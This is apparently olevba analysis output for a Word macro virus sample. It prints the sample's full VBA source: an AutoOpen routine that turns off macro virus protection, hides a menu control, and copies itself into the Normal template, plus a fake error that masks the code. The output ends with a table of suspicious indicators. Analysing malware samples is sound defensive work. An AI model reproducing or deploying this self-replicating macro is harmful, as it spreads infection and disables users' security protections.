olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Example.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Example.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Virus2.bas 
in file: Virus.MSWord.Example.b - OLE stream: 'Macros/VBA/Virus2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.EnableCancelKey = False 'Prodection
Options.VirusProtection = False     'Prodection
Application.CommandBars("Tools").Controls(12).Enabled = False 'Stealth
If UCase(ThisDocument.Name) = "NORMAL.DOT" Then
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Virus2" Then GoTo EndOfVirus
    Next i
   VSource = NormalTemplate.FullName
    VDestiny = ActiveDocument.FullName
Else
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "Virus2" Then GoTo EndOfVirus
    Next i
    VSource = ActiveDocument.FullName
    VDestiny = NormalTemplate.FullName
End If
Application.OrganizerCopy VSource, VDestiny, "ExampleVirus", wdOrganizerObjectProjectItems
EndOfVirus:
End Sub

Sub ViewVBCode()
MsgBox "Error: 8934", vbExclamation, "VB Editor"    'Display a false error message
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

